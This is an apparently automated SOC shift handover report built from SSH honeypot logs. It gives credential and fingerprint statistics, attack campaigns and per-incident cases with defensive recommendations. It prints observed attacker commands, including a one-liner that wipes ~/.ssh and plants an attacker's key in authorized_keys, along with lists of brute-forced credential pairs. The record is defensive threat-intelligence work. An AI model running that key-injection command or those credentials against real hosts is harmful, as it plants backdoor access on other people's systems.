# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-16 |
| **Generated At** | 2026-07-16T23:01:32Z |
| **Shift Time** | 23:01 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **236** |
| Confirmed Threats | **219** |
| False Positives Filtered | **17** (7.2%) |
| Unique Attacker IPs | **91** |
| Countries of Origin | **26** |
| High Severity Cases | **91** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **145** |
| Malware Samples Analyzed | **3** HIGH · **34** MED · 8 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **104** |
| Unique Credential Pairs | **44** |
| Unique Usernames | **24** |
| Unique Passwords | **34** |
| Successful Auth Pairs | **85** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 29 |
| `support` | 12 |
| `test` | 6 |
| `nobody` | 6 |
| `admin` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `Host: 129.80.119.236:23` | 16 |
| `admin` | 8 |
| `qwerty1234` | 6 |
| `100` | 5 |
| `LeitboGi0ro` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `nobody` | `qwerty1234` | 6 |
| `admin` | `admin` | 5 |
| `100` | `100` | 5 |
| `root` | `LeitboGi0ro` | 5 |
| `345gs5662d34` | `345gs5662d34` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `miguel` | `miguel` | `116.228.195.251` | 2026-07-16T20:59:47 |
| `miguel` | `miguel` | `61.2.228.177` | 2026-07-16T20:59:56 |
| `root` | `---fuck_you----` | `101.96.238.202` | 2026-07-16T21:02:20 |
| `test` | `qwerty12` | `111.70.32.10` | 2026-07-16T21:02:47 |
| `test` | `qwerty12` | `24.142.170.231` | 2026-07-16T21:02:54 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `35.203.210.61` | 2026-07-16T21:03:27 |
| `ubuntu` | `hduser12` | `10.0.0.73` | 2026-07-16T21:07:33 |
| `admin` | `admin` | `130.211.102.114` | 2026-07-16T21:07:47 |
| `www` | `test` | `200.73.20.104` | 2026-07-16T21:09:48 |
| `345gs5662d34` | `345gs5662d34` | `200.73.20.104` | 2026-07-16T21:09:51 |
| `www` | `3245gs5662d34` | `200.73.20.104` | 2026-07-16T21:09:52 |
| `ubuntu` | `hduser12` | `185.242.3.195` | 2026-07-16T21:10:38 |
| `support` | `support` | `176.53.159.196` | 2026-07-16T21:14:27 |
| `100` | `100` | `2.139.168.236` | 2026-07-16T21:15:13 |
| `100` | `100` | `122.160.142.194` | 2026-07-16T21:15:27 |
| `support` | `support` | `10.0.0.73` | 2026-07-16T21:15:46 |
| `100` | `100` | `187.8.120.90` | 2026-07-16T21:18:42 |
| `100` | `100` | `101.13.4.119` | 2026-07-16T21:18:50 |
| `100` | `100` | `10.0.0.73` | 2026-07-16T21:19:06 |
| `centos` | `abcd1234` | `10.0.0.73` | 2026-07-16T21:24:44 |
| `antonio` | `antonio` | `77.106.78.215` | 2026-07-16T21:27:35 |
| `antonio` | `antonio` | `117.191.83.250` | 2026-07-16T21:27:45 |
| `root` | `P@ssword.123` | `112.137.143.2` | 2026-07-16T21:28:45 |
| `345gs5662d34` | `345gs5662d34` | `112.137.143.2` | 2026-07-16T21:28:49 |
| `root` | `3245gs5662d34` | `112.137.143.2` | 2026-07-16T21:28:51 |
| `antonio` | `antonio` | `217.52.226.144` | 2026-07-16T21:31:04 |
| `root` | `123456Abcd` | `45.129.242.233` | 2026-07-16T21:32:40 |
| `345gs5662d34` | `345gs5662d34` | `45.129.242.233` | 2026-07-16T21:32:42 |
| `root` | `3245gs5662d34` | `45.129.242.233` | 2026-07-16T21:32:43 |
| `support` | `112233` | `211.169.212.206` | 2026-07-16T21:40:06 |
| `support` | `112233` | `218.28.18.2` | 2026-07-16T21:40:15 |
| `root` | `@dm1n` | `103.61.122.229` | 2026-07-16T21:42:01 |
| `support` | `112233` | `61.185.30.170` | 2026-07-16T21:43:14 |
| `nobody` | `qwerty1234` | `65.20.161.126` | 2026-07-16T21:45:31 |
| `nobody` | `qwerty1234` | `45.236.19.9` | 2026-07-16T21:45:44 |
| `root` | `QWEasd123` | `185.242.3.195` | 2026-07-16T21:46:12 |
| `admin` | `admin` | `121.41.31.208` | 2026-07-16T21:46:47 |
| `nobody` | `qwerty1234` | `196.219.93.108` | 2026-07-16T21:48:59 |
| `nobody` | `qwerty1234` | `122.160.85.144` | 2026-07-16T21:49:08 |
| `nobody` | `qwerty1234` | `10.0.0.73` | 2026-07-16T21:49:27 |
| `root` | `root123456` | `65.20.202.4` | 2026-07-16T21:55:52 |
| `root` | `root123456` | `10.0.0.73` | 2026-07-16T21:56:12 |
| `root` | `QWEasd123` | `10.0.0.73` | 2026-07-16T22:00:07 |
| `support` | `qwerty123456` | `60.249.251.88` | 2026-07-16T22:04:31 |
| `support` | `qwerty123456` | `49.124.154.171` | 2026-07-16T22:04:41 |
| `support` | `qwerty123456` | `201.63.52.54` | 2026-07-16T22:08:08 |
| `root` | `qwer@2024` | `197.248.207.138` | 2026-07-16T22:09:03 |
| `345gs5662d34` | `345gs5662d34` | `197.248.207.138` | 2026-07-16T22:09:07 |
| `root` | `3245gs5662d34` | `197.248.207.138` | 2026-07-16T22:09:09 |
| `Root` | `admin` | `196.188.93.169` | 2026-07-16T22:10:05 |
| `Root` | `admin` | `171.217.70.151` | 2026-07-16T22:10:18 |
| `Root` | `admin` | `10.0.0.73` | 2026-07-16T22:13:59 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-16T22:16:54 |
| `root` | `daniel` | `101.13.2.183` | 2026-07-16T22:17:22 |
| `root` | `daniel` | `103.158.138.179` | 2026-07-16T22:20:49 |
| `root` | `daniel` | `83.239.84.130` | 2026-07-16T22:20:57 |
| `admin` | `admin` | `195.178.110.137` | 2026-07-16T22:22:44 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-16T22:25:28 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-16T22:25:29 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-16T22:25:36 |
| `user` | `marketing` | `121.179.93.147` | 2026-07-16T22:29:25 |
| `root` | `123@@@` | `165.1.75.106` | 2026-07-16T22:29:26 |
| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-07-16T22:29:27 |
| `user` | `marketing` | `10.0.0.73` | 2026-07-16T22:33:00 |
| `root` | `casa` | `192.34.128.202` | 2026-07-16T22:34:46 |
| `root` | `1q2w3e4r` | `185.242.3.195` | 2026-07-16T22:39:56 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-16T22:41:28 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-16T22:41:28 |
| `ubuntu` | `@dm1n` | `103.61.122.229` | 2026-07-16T22:42:39 |
| `test` | `123654` | `182.76.36.62` | 2026-07-16T22:45:23 |
| `test` | `123654` | `20.46.45.121` | 2026-07-16T22:45:36 |
| `GET / HTTP/1.0` | `` | `165.245.241.122` | 2026-07-16T22:45:41 |
| `OPTIONS / HTTP/1.0` | `` | `165.245.241.122` | 2026-07-16T22:45:46 |
| `test` | `123654` | `10.0.0.73` | 2026-07-16T22:45:48 |
| `OPTIONS / RTSP/1.0` | `` | `165.245.241.122` | 2026-07-16T22:45:51 |
| `OPTIONS sip:nm SIP/2.0` | `Via: SIP/2.0/TCP nm;branch=foo` | `165.245.241.122` | 2026-07-16T22:46:30 |
| `GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1` | `Host: 129.80.119.236:23` | `46.101.133.128` | 2026-07-16T22:46:37 |
| `GET /solr/admin/info/system HTTP/1.1` | `Host: 129.80.119.236:23` | `104.248.251.155` | 2026-07-16T22:46:38 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `104.248.142.195` | 2026-07-16T22:46:39 |
| `GET /v2/_catalog HTTP/1.1` | `Host: 129.80.119.236:23` | `159.89.109.204` | 2026-07-16T22:46:39 |
| `GET /cgi-bin/authLogin.cgi HTTP/1.1` | `Host: 129.80.119.236:23` | `46.101.236.241` | 2026-07-16T22:46:40 |
| `GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1` | `Host: 129.80.119.236:23` | `104.248.251.155` | 2026-07-16T22:46:46 |
| `support` | `1234567` | `65.20.187.47` | 2026-07-16T22:53:51 |
| `support` | `1234567` | `78.189.17.35` | 2026-07-16T22:53:58 |
| `root` | `1q2w3e4r` | `10.0.0.73` | 2026-07-16T22:54:08 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **236** |
| Sessions with Fingerprint | **16** |
| Unique HASSH Fingerprints | **16** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 33 |
| libssh | 14 |
| Go SSH scanner | 14 |
| Paramiko (Python) | 10 |
| Nmap scanner | 8 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 33 | 33 |
| `f555226df196...` | Mirai/variant | 13 | 5 |
| `a2de0f306611...` | Mirai/variant | 10 | 3 |
| `e788c657d1a2...` | Mirai/variant | 6 | 1 |
| `16443846184e...` | Generic scanner | 6 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 33 | 33 | Mirai/variant |
| `f555226df196...` | libssh | 13 | 5 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 10 | 3 | Mirai/variant |
| `e788c657d1a2...` | Nmap scanner | 6 | 1 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 6 | 2 | Generic scanner |
| `873a5fb5fedc...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `dd9bcf093c35...` | Unknown | 2 | 2 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **9** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
busybox TEST
```
```
cat /proc
```
```
/
```
Source IPs: `94.154.43.60`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `45.129.242.233`, `200.73.20.104`, `112.137.143.2`, `197.248.207.138`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **91** |
| Unique ASNs | **57** |
| High-Risk ASNs | **49** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS14061` | DigitalOcean, LLC | 10 | HIGH |
| `AS396982` | Google LLC | 6 | HIGH |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS22773` | Cox Communications Inc. | 3 | MEDIUM |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS31898` | Oracle Corporation | 3 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 3 | HIGH |
| `AS24158` | Taiwan Mobile Co., Ltd. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (89)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-0af79fa7cf10

| Field | Detail |
|---|---|
| **Source IP** | `116.228.195[.]251` |
| **First Seen** | 2026-07-16 20:59 |
| **Last Seen** | 2026-07-16 20:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 20:59:45` | `cowrie.session.connect` |
| `2026-07-16 20:59:46` | `cowrie.client.version` |
| `2026-07-16 20:59:46` | `cowrie.client.kex` |
| `2026-07-16 20:59:47` | `cowrie.login.success` |
| `2026-07-16 20:59:48` | `cowrie.direct-tcpip.request` |
| `2026-07-16 20:59:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.228.195[.]251` to AbuseIPDB if not already reported
- [ ] Block `116.228.195[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be5abfd295c6

| Field | Detail |
|---|---|
| **Source IP** | `61.2.228[.]177` |
| **First Seen** | 2026-07-16 20:59 |
| **Last Seen** | 2026-07-16 21:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 20:59:54` | `cowrie.session.connect` |
| `2026-07-16 20:59:54` | `cowrie.client.version` |
| `2026-07-16 20:59:54` | `cowrie.client.kex` |
| `2026-07-16 20:59:56` | `cowrie.login.success` |
| `2026-07-16 20:59:57` | `cowrie.direct-tcpip.request` |
| `2026-07-16 21:00:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.2.228[.]177` to AbuseIPDB if not already reported
- [ ] Block `61.2.228[.]177` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-810b932fde89

| Field | Detail |
|---|---|
| **Source IP** | `101.96.238[.]202` |
| **First Seen** | 2026-07-16 21:02 |
| **Last Seen** | 2026-07-16 21:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 21:02:18` | `cowrie.session.connect` |
| `2026-07-16 21:02:18` | `cowrie.client.version` |
| `2026-07-16 21:02:19` | `cowrie.client.kex` |
| `2026-07-16 21:02:20` | `cowrie.login.success` |
| `2026-07-16 21:02:22` | `cowrie.session.params` |
| `2026-07-16 21:02:22` | `cowrie.command.input` |
| `2026-07-16 21:02:23` | `cowrie.log.closed` |
| `2026-07-16 21:02:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.238[.]202` to AbuseIPDB if not already reported
- [ ] Block `101.96.238[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5077f06536a

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]10` |
| **First Seen** | 2026-07-16 21:02 |
| **Last Seen** | 2026-07-16 21:02 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 21:02:43` | `cowrie.session.connect` |
| `2026-07-16 21:02:44` | `cowrie.client.version` |
| `2026-07-16 21:02:44` | `cowrie.client.kex` |
| `2026-07-16 21:02:47` | `cowrie.login.success` |
| `2026-07-16 21:02:47` | `cowrie.direct-tcpip.request` |
| `2026-07-16 21:02:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]10` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe4c0acb9450

| Field | Detail |
|---|---|
| **Source IP** | `24.142.170[.]231` |
| **First Seen** | 2026-07-16 21:02 |
| **Last Seen** | 2026-07-16 21:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 21:02:53` | `cowrie.session.connect` |
| `2026-07-16 21:02:53` | `cowrie.client.version` |
| `2026-07-16 21:02:53` | `cowrie.client.kex` |
| `2026-07-16 21:02:54` | `cowrie.login.success` |
| `2026-07-16 21:02:55` | `cowrie.direct-tcpip.request` |
| `2026-07-16 21:02:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.142.170[.]231` to AbuseIPDB if not already reported
- [ ] Block `24.142.170[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdb63baf7a1e

| Field | Detail |
|---|---|
| **Source IP** | `130.211.102[.]114` |
| **First Seen** | 2026-07-16 21:07 |
| **Last Seen** | 2026-07-16 21:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 21:07:45` | `cowrie.session.connect` |
| `2026-07-16 21:07:45` | `cowrie.client.version` |
| `2026-07-16 21:07:45` | `cowrie.client.kex` |
| `2026-07-16 21:07:47` | `cowrie.login.success` |
| `2026-07-16 21:07:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.211.102[.]114` to AbuseIPDB if not already reported
- [ ] Block `130.211.102[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e0e5c510fdd

| Field | Detail |
|---|---|
| **Source IP** | `200.73.20[.]104` |
| **First Seen** | 2026-07-16 21:09 |
| **Last Seen** | 2026-07-16 21:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 21:09:48` | `cowrie.session.connect` |
| `2026-07-16 21:09:48` | `cowrie.client.version` |
| `2026-07-16 21:09:48` | `cowrie.client.kex` |
| `2026-07-16 21:09:48` | `cowrie.login.success` |
| `2026-07-16 21:09:49` | `cowrie.session.params` |
| `2026-07-16 21:09:49` | `cowrie.command.input` |
| `2026-07-16 21:09:49` | `cowrie.command.failed` |
| `2026-07-16 21:09:50` | `cowrie.log.closed` |
| `2026-07-16 21:09:50` | `cowrie.session.params` |
| `2026-07-16 21:09:50` | `cowrie.command.input` |
| `2026-07-16 21:09:50` | `cowrie.session.file_download` |
| `2026-07-16 21:09:50` | `cowrie.log.closed` |
| `2026-07-16 21:09:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.73.20[.]104` to AbuseIPDB if not already reported
- [ ] Block `200.73.20[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2af23ecafd3

| Field | Detail |
|---|---|
| **Source IP** | `200.73.20[.]104` |
| **First Seen** | 2026-07-16 21:09 |
| **Last Seen** | 2026-07-16 21:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 21:09:51` | `cowrie.session.connect` |
| `2026-07-16 21:09:51` | `cowrie.client.version` |
| `2026-07-16 21:09:51` | `cowrie.client.kex` |
| `2026-07-16 21:09:51` | `cowrie.login.success` |
| `2026-07-16 21:09:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.73.20[.]104` to AbuseIPDB if not already reported
- [ ] Block `200.73.20[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-173861b9e0c1

| Field | Detail |
|---|---|
| **Source IP** | `200.73.20[.]104` |
| **First Seen** | 2026-07-16 21:09 |
| **Last Seen** | 2026-07-16 21:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 21:09:52` | `cowrie.session.connect` |
| `2026-07-16 21:09:52` | `cowrie.client.version` |
| `2026-07-16 21:09:52` | `cowrie.client.kex` |
| `2026-07-16 21:09:52` | `cowrie.login.success` |
| `2026-07-16 21:09:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.73.20[.]104` to AbuseIPDB if not already reported
- [ ] Block `200.73.20[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f975134a77cd

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-16 21:10 |
| **Last Seen** | 2026-07-16 21:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 21:10:38` | `cowrie.session.connect` |
| `2026-07-16 21:10:38` | `cowrie.client.version` |
| `2026-07-16 21:10:38` | `cowrie.client.kex` |
| `2026-07-16 21:10:38` | `cowrie.login.success` |
| `2026-07-16 21:10:39` | `cowrie.session.params` |
| `2026-07-16 21:10:39` | `cowrie.command.input` |
| `2026-07-16 21:10:39` | `cowrie.log.closed` |
| `2026-07-16 21:10:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65e4f91f7e37

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-16 21:14 |
| **Last Seen** | 2026-07-16 21:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 21:14:27` | `cowrie.session.connect` |
| `2026-07-16 21:14:27` | `cowrie.client.version` |
| `2026-07-16 21:14:27` | `cowrie.client.kex` |
| `2026-07-16 21:14:27` | `cowrie.login.success` |
| `2026-07-16 21:14:27` | `cowrie.direct-tcpip.request` |
| `2026-07-16 21:14:27` | `cowrie.direct-tcpip.data` |
| `2026-07-16 21:14:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e2bc6e14333

| Field | Detail |
|---|---|
| **Source IP** | `2.139.168[.]236` |
| **First Seen** | 2026-07-16 21:15 |
| **Last Seen** | 2026-07-16 21:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 21:15:11` | `cowrie.session.connect` |
| `2026-07-16 21:15:12` | `cowrie.client.version` |
| `2026-07-16 21:15:12` | `cowrie.client.kex` |
| `2026-07-16 21:15:13` | `cowrie.login.success` |
| `2026-07-16 21:15:14` | `cowrie.direct-tcpip.request` |
| `2026-07-16 21:15:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.139.168[.]236` to AbuseIPDB if not already reported
- [ ] Block `2.139.168[.]236` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fd9903aa38a

| Field | Detail |
|---|---|
| **Source IP** | `122.160.142[.]194` |
| **First Seen** | 2026-07-16 21:15 |
| **Last Seen** | 2026-07-16 21:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 21:15:24` | `cowrie.session.connect` |
| `2026-07-16 21:15:24` | `cowrie.client.version` |
| `2026-07-16 21:15:24` | `cowrie.client.kex` |
| `2026-07-16 21:15:27` | `cowrie.login.success` |
| `2026-07-16 21:15:27` | `cowrie.direct-tcpip.request` |
| `2026-07-16 21:15:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.142[.]194` to AbuseIPDB if not already reported
- [ ] Block `122.160.142[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-214a58013aa4

| Field | Detail |
|---|---|
| **Source IP** | `187.8.120[.]90` |
| **First Seen** | 2026-07-16 21:18 |
| **Last Seen** | 2026-07-16 21:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 21:18:39` | `cowrie.session.connect` |
| `2026-07-16 21:18:40` | `cowrie.client.version` |
| `2026-07-16 21:18:40` | `cowrie.client.kex` |
| `2026-07-16 21:18:42` | `cowrie.login.success` |
| `2026-07-16 21:18:42` | `cowrie.direct-tcpip.request` |
| `2026-07-16 21:18:47` | `cowrie.session.closed` |

**Recommended Actions:**
